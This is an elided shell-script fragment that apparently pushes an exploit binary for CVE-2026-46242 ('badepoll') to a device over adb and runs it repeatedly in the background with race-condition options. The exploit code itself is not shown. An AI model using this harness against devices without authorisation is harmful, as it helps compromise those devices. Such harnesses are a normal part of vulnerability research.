...
BIN="cves/build/$TARGET/cve-2026-46242-badepoll"
...
for shot in $(seq 1 "$SHOTS"); do
	...
	A push "$BIN" "$D/cve-2026-46242-badepoll" >/dev/null 2>&1; A shell chmod 755 "$D/cve-2026-46242-badepoll"
	...
	A shell "rm -f $D/wpoke_run.log $D/bp_wpoke_resolved $D/bp_wpoke_go; nohup $D/cve-2026-46242-badepoll --wpoke --race $ROUNDS --max-seconds $MAXSEC > $D/wpoke_run.log 2>&1 &" >/dev/null 2>&1
